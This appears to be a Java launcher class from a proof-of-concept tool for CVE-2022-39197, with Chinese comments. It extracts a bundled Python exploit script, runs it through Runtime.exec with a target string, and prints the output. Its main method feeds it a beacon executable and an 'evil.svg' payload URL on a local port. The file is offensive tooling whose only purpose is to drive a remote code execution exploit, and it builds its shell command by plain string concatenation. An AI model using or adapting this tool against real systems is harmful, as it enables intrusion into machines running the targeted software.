import java.io.*;

public class cs_rce {
    public static String poc(String target){
        try {
            //绝对路径或者项目根目录相对路径,eg:src/main/python/xx.py/或C:\\Users\\xx\\Desktop\\cve-2022-39197.py,exe文件同理
            //if (pyexe == null || py == null || exe == null || svg == null ){}
           // String[] args1 = new String[]{"python3", "src/main/python/cve_2022_39197.py", exe, svg};
            //System.out.println(Arrays.toString(args1));
            //string的话系统会对这个字符串根据空格进行拆分分参
            //String s="python3 /Users/romanc9/software/CSRCE/CVE-2022-39197-master/cve-2022-39197.py beacon.exe http://127.0.0.1:4444/evil.svg";
           //String filePath = cs_rce.class.getClassLoader().getResource("cve_2022_39197.py").getPath();

            String filename = "cve_2022_39197.py";
            InputStream inputStream = cs_rce.class.getResourceAsStream("/"+filename);  //"/"表示在classpath的根目录下查找
            //System.out.println("[+]"+filePath+"\n");
            File file = new File(filename);
            FileOutputStream outputStream = new FileOutputStream(file);  // 将inputStream写入到临时文件file中
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, len); }

            // 执行python脚本
            //String[] args = new String[]{"python3", file.getAbsolutePath()};
            String s="python3 "+file.getAbsolutePath()+" "+target;
            System.out.println(s);
            Process proc = Runtime.getRuntime().exec(s);// 执行py文件

            //获取输入流
            BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            //获取错误流
            BufferedReader errorStreamReader = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            String line = null;
            String result="";
            while ((line = in.readLine()) != null) { //读取输入流
                result =result+line+"\n";
            }
            while ((line = errorStreamReader.readLine()) != null) {//读取错误流
                result =result+line+"\n";
            }
            in.close();
            //等待子进程退出
            proc.waitFor();
            return "[+] 执行结果:\n"+result+"\n";
        } catch (IOException | InterruptedException e) {
            //e.printStackTrace();
            return e.toString();
        }
    }
    public static void main(String[] args) throws Exception {
        System.out.println(poc("beacon.exe http://127.0.0.1:4444/evil.svg"));
    }
}